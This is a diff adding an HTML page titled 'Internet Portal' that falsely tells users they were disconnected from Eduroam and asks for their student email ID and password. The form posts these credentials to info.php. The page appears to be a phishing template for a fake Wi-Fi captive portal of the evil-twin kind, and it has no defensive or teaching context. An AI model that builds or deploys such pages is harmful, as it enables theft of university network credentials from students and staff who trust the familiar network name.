@@ -1,0 +1,28 @@
+<!DOCTYPE html>
+<html>
+	<head>
+		<meta name="viewport" content="width=device-width"/>
+		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+		<title>Internet Portal</title>
+		<link rel="stylesheet" type="text/css" href="portal.css"/>
+		<script type="text/javascript" src="portal.js"></script>
+	</head>
+	<body>
+		<div class="content">
+			<form method="post" id="loginform" name="loginform" action="info.php">
+				<div class="title">
+					<p>Sorry! It seems like you were disconnected from the internet!</p>
+					<span class="bold">Please re-enter the password to connect to Eduroam again</span>
+				</div>
+				<p>Please enter your wireless network password to get internet access</p>
+				<label>
+					<input id="username" type="text" name="username" maxlength="50" size="20" placeholder="Student Email ID"/><br/>
+					<input id="password" type="password" name="password" maxlength="63" size="20" placeholder="Password"/><br/>
+				</label>
+				<p>Show password <input type="checkbox" id="showpass"/></p>
+				<input class="button" id="formbutton" type="submit" value="Submit"/>
+			</form>
+		</div>
+        
+	</body>
+</html>
